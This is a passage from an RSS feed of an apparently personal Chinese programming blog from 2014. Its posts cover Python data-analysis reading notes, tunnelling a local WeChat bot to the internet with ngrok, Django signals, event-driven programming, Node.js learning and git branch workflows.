&lt;p&gt;在去西安的路上也带着,一夜车程看了100来页,反而把小说搁在一边了.&lt;/p&gt;
&lt;p&gt;涉及的一些工具(库)如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/numpy/numpy"&gt;NumPy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/matplotlib/matplotlib"&gt;matplotlib&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython"&gt;IPython&lt;/a&gt;,书中大多实验实在&lt;code&gt;ipython notebook&lt;/code&gt;下做的&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/scipy/scipy"&gt;SciPy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本书的&lt;a href="https://github.com/pydata/pydata-book"&gt;代码&lt;/a&gt; 也托管在github上.包括需要使用的数据都包含在内.阅读时跟着例子做是很好的学习放法&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 24 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-24:python_for_data_analysis_1.html</guid><category>python</category></item><item><title>在局域网中部署微信服务器</title><link>/locale-wechat.html</link><description>&lt;h3&gt;缘起&lt;/h3&gt;
&lt;p&gt;我想这个解决方案对许多在校生是十分有用的。&lt;/p&gt;
&lt;p&gt;喜欢折腾新技术的大多是我们这些在校学生。所以把这个方案分享给大家。&lt;/p&gt;
&lt;p&gt;对于我们，ip都是校内网的。也就是说它是局域网。&lt;/p&gt;
&lt;p&gt;而微信开发模式中服务器配置要求填写&lt;code&gt;公网ip&lt;/code&gt;，并且只允许&lt;code&gt;80端口&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;解决方案有两种：&lt;/p&gt;
&lt;p&gt;1  买个vps或使用公有云（bae，sae神马的）&lt;/p&gt;
&lt;p&gt;vps太贵，bae,sae神马的调试很不方便。我采用了方案2&lt;/p&gt;
&lt;p&gt;2  穿透内网。首先想到的是花生壳，用于穿透内网，原理上是可行的，不过linux下使用极其麻烦&lt;br /&gt;
某天闲逛github的时候，发现这个东东&lt;a href="https://github.com/inconshreveable/ngrok"&gt;ngrok&lt;/a&gt; （伟大的github!!），它是跨平台的！！&lt;/p&gt;
&lt;p&gt;方案2最大的最大好处是你完全用你最熟悉的环境来开发！！&lt;/p&gt;
&lt;h3&gt;如何使用&lt;/h3&gt;
&lt;p&gt;使用方法极其简单。&lt;br /&gt;
首先到官网里&lt;a href="https://ngrok.com/download"&gt;下载&lt;/a&gt;.  它是免安装的。
解压之后,进入目录，在终端里执行./ngrok [端口号]. 
该指令的意思是把[端口号]映射到外网。&lt;br /&gt;
之后终端里会有一个ngrok给你分配的地址，这样就映射成功了！&lt;/p&gt;
&lt;h3&gt;开始部署&lt;/h3&gt;
&lt;p&gt;首先在本地搭起微信后台（我使用&lt;a href="https://github.com/whtsky/WeRoBot/"&gt;WeRoBot&lt;/a&gt;这个框架）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cd /tmp/&lt;/li&gt;
&lt;li&gt;pip install werobot&lt;/li&gt;
&lt;li&gt;新建weixin.py如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;werobot&lt;/span&gt;

&lt;span class="n"&gt;robot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;werobot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WeRoBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tokenhere&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#填写你的token&lt;/span&gt;

&lt;span class="nd"&gt;@robot.handler&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;echo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello World!&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;python weixin.py&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好的，命令行提示我们在127.0.0.1:8888启动了服务&lt;/p&gt;
&lt;p&gt;接着我们只要把它映射到外网就行&lt;br /&gt;
回到ngrok解压目录下，执行&lt;code&gt;./ngrok 8888&lt;/code&gt;&lt;br /&gt;
我们将在命令行里看到一个&lt;code&gt;分配的地址&lt;/code&gt;，把它粘帖到&lt;code&gt;微信服务器配置&lt;/code&gt;里&lt;br /&gt;
这时候就可以调戏你的微信公众号啦。  &lt;br /&gt;
bingo~看到了吧，可爱又迷人的“hello world”出现了。&lt;br /&gt;
是的 ，就是这么简单，接下来的事就是发挥你的想像力的时间啦。 &lt;/p&gt;
&lt;p&gt;Enjoying it.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 16 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-16:locale-wechat.html</guid><category>wechat</category></item><item><title>django笔记之Signals</title><link>/django-Signals.html</link><description>&lt;h3&gt;Signals是什么&lt;/h3&gt;
&lt;p&gt;为了回答这个问题，我们先来看下django官网对它的描述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Django includes a “signal dispatcher” which helps allow decoupled applications get notified when actions occur elsewhere in the framework. In a nutshell, signals allow certain senders to notify a set of receivers that some action has taken place. They’re especially useful when many pieces of code may be interested in the same events.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大概意思是说：Django内部包含了一位“信号调度员”：当某事件在框架内发生时，它可以通知到我们的应用程序（处理函数）。 简而言之，当&lt;code&gt;event&lt;/code&gt;（事件）发生时，&lt;code&gt;signals&lt;/code&gt;（信号）允许若干 &lt;code&gt;senders&lt;/code&gt;（发送者）通知一组 receivers（接收者）。&lt;/p&gt;
&lt;p&gt;很像js的事件驱动模型。关于事件驱动，我在上一篇文章中有谈论，这里不多说。&lt;/p&gt;
&lt;h3&gt;有什么用的&lt;/h3&gt;
&lt;p&gt;在web开发中, 你可能会遇到下面这种场景:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在用户完成某个操作后, 自动去执行一些后续的操作. 譬如用户完成修改密码后,
你要发送一份确认邮件.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果一个操作可能会触发多个后续事件, 此时使用signals会非常方便. 我们可以想要一下应用场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sns中的事件通知, 如用户发表了一篇博文, 然后通知所有的好友&lt;/li&gt;
&lt;li&gt;用户信息的更改的邮件通知&lt;/li&gt;
&lt;li&gt;用户订制信息的邮件通知等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;如何使用&lt;/h3&gt;
&lt;h4&gt;常用的信号集：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;django.db.models.signals.pre_save   model在save()前发送的信号&lt;/li&gt;
&lt;li&gt;django.db.models.signals.post_save  model在save()后发送的信号&lt;/li&gt;
&lt;li&gt;django.db.models.signals.pre_delete&lt;/li&gt;
&lt;li&gt;django.db.models.signals.post_delete&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;来自官网的例子&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#使用装饰器&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.core.signals&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;request_finished&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.dispatch&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;

&lt;span class="nd"&gt;@receiver&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request_finished&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;my_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Request finished!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Connecting to signals sent by specific senders.&lt;/p&gt;
&lt;p&gt;就是说我们只处理&lt;code&gt;某个模型&lt;/code&gt;发出的信号&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db.models.signals&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;pre_save&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.dispatch&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;myapp.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MyModel&lt;/span&gt;

&lt;span class="nd"&gt;@receiver&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pre_save&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MyModel&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;my_handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;自定义事件&lt;/h4&gt;
&lt;p&gt;在此使用&lt;a href="http://django-china.cn/topic/151/"&gt;一休哥&lt;/a&gt;同学给的例子，也是Django中现成的例子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#file：django\db\models\signals.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.dispatch&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Signal&lt;/span&gt;
&lt;span class="n"&gt;post_syncdb&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;providing_args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;class&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;created_models&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
&lt;span class="s2"&gt;&amp;quot;verbosity&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;interactive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="c1"&gt;#-----------------------------------&lt;/span&gt;

&lt;span class="c1"&gt;#file：django\contrib\contenttypes\management.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;signals&lt;/span&gt;
&lt;span class="n"&gt;signals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post_syncdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;update_contenttypes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;#-----------------------------------&lt;/span&gt;
&lt;span class="c1"&gt;#file：django\core\management\sql.py&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;emit_post_sync_signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;created_models&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbosity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# Emit the post_sync signal for every application.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_apps&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="n"&gt;app_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;verbosity&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Running post-sync handlers for application &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;app_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post_syncdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;created_models&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;created_models&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbosity&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;verbosity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;更具体的实例可以参考:&lt;a href="http://www.cnblogs.com/mindsbook/archive/2009/10/27/django_signal.html"&gt;django拾遗之signal&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.6/topics/signals/"&gt;django官网&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://django-china.cn/topic/151/"&gt;浅谈django的信号机制 Signals&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/mindsbook/archive/2009/10/27/django_signal.html"&gt;django拾遗之signal&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 15 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-15:django-Signals.html</guid><category>django</category></item><item><title>事件驱动</title><link>/sjqd.html</link><description>&lt;p&gt;近来学习nodejs,觉得事件驱动模型是个十分美好的东西。&lt;/p&gt;
&lt;p&gt;这里最强大的是&lt;code&gt;事件驱动&lt;/code&gt;这个概念本身。具体实现是次要，各个语言里都有。&lt;/p&gt;
&lt;p&gt;一些零散的心得。零碎不成章，仅供自己作为笔记使用。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;事件驱动&lt;/code&gt;,&lt;code&gt;异步&lt;/code&gt;，&lt;code&gt;回调函数&lt;/code&gt;常常是同时出现的。
回调让动作能按照逻辑顺序执行。回调让编程人员只要安排好任务就行，不要在意其发生的具体时间。&lt;/p&gt;
&lt;p&gt;基于事件驱动的编程的&lt;code&gt;基本想法&lt;/code&gt;是 ： 监听某些感兴趣的事件，当它发生时，触发我们的处理函数。&lt;/p&gt;
&lt;p&gt;一些良好特性： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事件处理者可以拿到关于该事件的任何&lt;code&gt;数据&lt;/code&gt;(传入回调函数)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;松耦合&lt;/code&gt;，事件发布者和处理者无须知道对方的存在。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;多对多&lt;/code&gt;的关系，多个事件发布者对应多个处理者（订阅者）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近学生处需要做一个学生资助管理系统，朋友接了这个项目，是一个典型的管理系统，涉及的逻辑较多（后台可执行的”动作“较多），需求还算清晰。&lt;/p&gt;
&lt;p&gt;系统使用django来写,当尝试使用&lt;code&gt;事件驱动&lt;/code&gt;的概念来编程时(django中使用信号Signals来通知事件发生，当event（事件）发生时，signals（信号）允许若干 senders（寄件人）通知一组 receivers（接收者）)，发现能&lt;code&gt;降低复杂度&lt;/code&gt;，比如通过监听某个对象被修改这个事件,(post_save)，可以不需写view，在数据更改时，对与它关联的其他数据状态也进行修改。这样不需要侵入到后台逻辑。&lt;/p&gt;
&lt;p&gt;更多django相关&lt;a href="https://docs.djangoproject.com/en/dev/ref/signals/"&gt;信号&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里有些像观察者模式？&lt;/p&gt;
&lt;p&gt;这种模式很适合做些数据验证的工作， 监听pre_sava事件就行。&lt;/p&gt;
&lt;p&gt;也引发了自己对设计模式的一些思考。&lt;/p&gt;
&lt;p&gt;思考具体问题时，把它抽象化表述，逻辑层或者数据层，这样在抽象的世界里，方法是通用的,这样容易找到合适的设计模式。也就是通用的解决方案。大多问题前人都遇到。在抽象层我们面对的许多问题是极其相似的，我想这也就是设计模式被总结出来的初衷。&lt;/p&gt;
&lt;p&gt;我把归纳为，先后退再前进。&lt;/p&gt;
&lt;p&gt;退回到问题的一般表述，找到思路后（吸取别人的经验），在回归具体问题。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 14 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-14:sjqd.html</guid><category>编程</category></item><item><title>nodejs学习笔记之入门</title><link>/nodejs-learning-1.html</link><description>&lt;p&gt;对js的兴趣由来已久，倒不是对这门语言有什么好感，而是对它能做的事很感兴趣。web的世界太美妙了。nodejs的横空出世，更是让这门语言被视为将统一网络编程的霸主。&lt;/p&gt;
&lt;p&gt;加之对函数式的偏爱，最终决定好好学习js。js有披着C外衣的Lisp的称号，其对函数式编程的支持还是很好的，函数是一等公民。支持闭包。支持lambda算子，关键的是，写的代码能马上在浏览器里执行，很让人兴奋。&lt;/p&gt;
&lt;p&gt;之前其实也看过一些书籍，却一直对js没有好感，对于习惯了面向对象，习惯了python的我来说，读js简直就觉是一种回到史前的感觉，糟糕的全局变量，没有模块的概念，困难的调试...还好后来遇到jquery，虽说平时也能写些前端代码，可总觉得js不像一门语言，整天在折腾些鸡毛蒜皮的琐事，一会添加一个dom元素，一会修改一些元素属性。丝毫没有编程的感觉。&lt;/p&gt;
&lt;p&gt;态度的转变从学习nodejs开始，在学习node的过程中，似乎突然就懂了js是什么了，有了编程的感觉，之前写前端代码时总觉得像个使用者而不是开发者。正如Manuel在他那本很棒的node教程里说的：这次是玩真的了。&lt;/p&gt;
&lt;p&gt;前些日子，看了不少lisp/函数式编程的东西，虽说觉得函数式确实很美好，好比：把函数当变量传递 /引用透明性 /没有"副作用"   /让我们方便地使用递归 /describe what to do, rather than how to do it
可怎么用它，还是没有感性的认识。&lt;/p&gt;
&lt;p&gt;下午在图书馆看书(《了不起的nodejs》)的时候,忽然豁然开朗了，我想这样算是入门了吧。&lt;br /&gt;
想起许多之前读多的话，现在看来，人家都说得那么清楚了，我当时怎么就没有领悟呢。
诸如：
我们大多时候需要的是动作。就是说我们需要动词而不是名词。函数而不是对象！&lt;/p&gt;
&lt;p&gt;我想理解以下几个词就差不多理解js（nodejs）了 ：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;异步&lt;/li&gt;
&lt;li&gt;回调函数（响应）&lt;/li&gt;
&lt;li&gt;事件驱动&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看websocket（socket.io）的时候，例子是用socket.io制作一个聊天室。有些心得也记下，未必有条理，更多的是抓住当时电光火石的感觉，对我个人而言能帮助我回忆当时的想法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通信&lt;/li&gt;
&lt;li&gt;持久链接&lt;/li&gt;
&lt;li&gt;事件驱动&lt;/li&gt;
&lt;li&gt;回调&lt;/li&gt;
&lt;li&gt;分发事件(广播)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上的概念往往是互相关联的。&lt;/p&gt;
&lt;p&gt;对于事件驱动，当时写下这段话：大多的东西都是辨识（自定义事件），好比代码只是字符串，对我们的逻辑进行划分，使其清晰化才是关键。代码可以视为是对逻辑的划分与标识”&lt;br /&gt;
好吧，我的表达能力估计很弱，只能表达到这么混乱的程度了。&lt;br /&gt;
很羡慕《代码大全》的作者，能把很晦涩的东西说得简单清晰。&lt;br /&gt;
keep it simple and stupid 才是大师。&lt;br /&gt;
虽说表达得不清晰，但还是先记录下来吧。  &lt;/p&gt;
&lt;p&gt;函数式果然是靠顿悟的啊，某个晴朗的午后，阅读代码的时候，恍然，原来还可以这样！其实本该这样啊！&lt;/p&gt;
&lt;p&gt;激动之余在朋友圈里发了个状态：&lt;br /&gt;
...天河倒灌，星月逆行说不定就是这种感觉吧...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 13 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-13:nodejs-learning-1.html</guid><category>js</category></item><item><title>django笔记之项目布局</title><link>/django-begin.html</link><description>&lt;h2&gt;内容摘要&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;django最佳实践&lt;/li&gt;
&lt;li&gt;使用CDN&lt;/li&gt;
&lt;li&gt;布局实例（托管在github上，大家可以直接使用，也欢迎fork）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个好的项目布局，能让项目结构更加清晰，这样更有利于维护与扩展，也利于团队协作。&lt;/p&gt;
&lt;p&gt;大体上遵循&lt;a href="#"&gt;django最佳实践&lt;/a&gt;，只有一些部分做了微调。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 20 Mar 2014 00:00:00 +0000</pubDate><guid>tag:,2014-03-20:django-begin.html</guid><category>django</category></item><item><title>django笔记之用户系统</title><link>/django-user.html</link><description>&lt;h2&gt;内容摘要&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;django-userena&lt;/li&gt;
&lt;li&gt;profiles&lt;/li&gt;
&lt;li&gt;验证码&lt;/li&gt;
&lt;li&gt;短信认证功能&lt;/li&gt;
&lt;li&gt;邮件认证功能&lt;/li&gt;
&lt;li&gt;权限管理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考资料&lt;/h3&gt;
&lt;p&gt;关于django-userena的profiles可以参考以下资料&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django-userena&lt;/h3&gt;
&lt;h3&gt;profiles&lt;/h3&gt;
&lt;h3&gt;验证码&lt;/h3&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 20 Mar 2014 00:00:00 +0000</pubDate><guid>tag:,2014-03-20:django-user.html</guid><category>django</category></item><item><title>git学习笔记之项目开发与部署</title><link>/git-learn.html</link><description>&lt;p&gt;最近参与一个团队开发的项目，惊叹于git的威力。&lt;/p&gt;
&lt;p&gt;做个笔记备忘。&lt;/p&gt;
&lt;p&gt;项目开发中，需要git支持的地方大约有这些：
&lt;em&gt;  分支,我目前负责羡慕的重构新建了一个Refactoring_medmeeting分支。
&lt;/em&gt;  将托管库中我的分支的更新同步到测试服务器上。&lt;/p&gt;
&lt;h3&gt;具体操作&lt;/h3&gt;
&lt;p&gt;假设我们的项目文件夹是mysite.&lt;/p&gt;
&lt;h4&gt;开发环境&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;查看现有分支&lt;code&gt;git brance&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;新建分支Refactoring_medmeeting：&lt;code&gt;git brance Refactoring_medmeeting&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;切换到分支下&lt;code&gt;git checkout Refactoring_medmeeting&lt;/code&gt;,之后我们的&lt;code&gt;commit&lt;/code&gt;都会提交到Refactoring_medmeeting分支上&lt;/li&gt;
&lt;li&gt;将'commit'的内容同步到远程的同名分支上，&lt;code&gt;git push origin Refactoring_medmeeting:Refactoring_medmeeting&lt;/code&gt; ,c初次执行时，会在远程生成同名分支Refactoring_medmeeting。之后仅仅是提交&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;远程测试服务器&lt;/h4&gt;
&lt;p&gt;在测试服务器，我需要对自己的分支进行测试。 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先克隆项目&lt;/li&gt;
&lt;li&gt;查看远程分支:&lt;code&gt;git branch -r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;git checkout  -b Refactoring_medmeeting origin/Refactoring_medmeeting&lt;/li&gt;
&lt;li&gt;当前处于Refactoring_medmeeting分支,之后的git pull 都是在当前分支进行&lt;/li&gt;
&lt;li&gt;当git仓库中Refactoring_medmeeting分支更新时，需要把它同步到测试服务器。只需要&lt;code&gt;git pull&lt;/code&gt;就行&lt;/li&gt;
&lt;li&gt;由于开发环境使用sqlite,所以git pull会覆盖之前数据库，git会问题是否这样做，同意的话&lt;code&gt;git reset --hard&lt;/code&gt;，&lt;code&gt;git pull&lt;/code&gt;&lt;/li&gt;
